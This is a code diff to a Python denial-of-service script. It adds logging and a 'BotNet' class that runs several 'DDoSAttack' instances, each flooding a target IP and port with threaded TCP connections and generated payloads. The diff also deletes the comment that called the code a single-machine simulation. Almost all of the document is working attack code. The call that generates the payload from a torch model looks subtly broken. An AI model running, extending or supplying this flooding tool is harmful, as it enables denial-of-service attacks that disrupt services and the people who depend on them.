@@ -3,6 +3,11 @@ import torch.nn as nn
 import socket
 import threading
 from .random_string_generator import RandomStringGenerator
+import logging
+
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
 
 class DDoSAttack:
@@ -21,25 +26,44 @@ class DDoSAttack:
 
     def create_connection(self):
         try:
-            # In a real DDoS attack, connections would be distributed over multiple IPs
-            # However, in this simulation we are only using a single machine
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_ip, self.target_port))
             payload = self.model(torch.tensor([])).encode()  # Generate payload
             sock.send(payload)
+            logging.info("Payload sent.")
             sock.send(b"QUIT")
             sock.close()
         except Exception as e:
-            print(f"Exception occurred while creating a connection: {e}")
+            logging.error(f"Exception occurred while creating a connection: {e}")
 
     def wait_for_threads(self):
         for thread in self.threads:
             thread.join()
 
 
+class BotNet:
+    def __init__(self, num_bots, target_ip, target_port, num_connections):
+        self.num_bots = num_bots
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.num_connections = num_connections
+        self.bots = []
+
+    def create_bots(self):
+        for _ in range(self.num_bots):
+            bot = DDoSAttack(self.target_ip, self.target_port, self.num_connections)
+            self.bots.append(bot)
+
+    def launch_attack(self):
+        for bot in self.bots:
+            bot.simulate_attack()
+        for bot in self.bots:
+            bot.wait_for_threads()
+
+
 if __name__ == "__main__":
-    ddos = DDoSAttack(
-        "192.168.1.1", 80, 500
-    )  # target IP, target port, number of connections
-    ddos.simulate_attack()
-    ddos.wait_for_threads()
+    botnet = BotNet(
+        10, "192.168.1.1", 80, 100
+    )  # num of bots, target IP, target port, connections per bot
+    botnet.create_bots()
+    botnet.launch_attack()
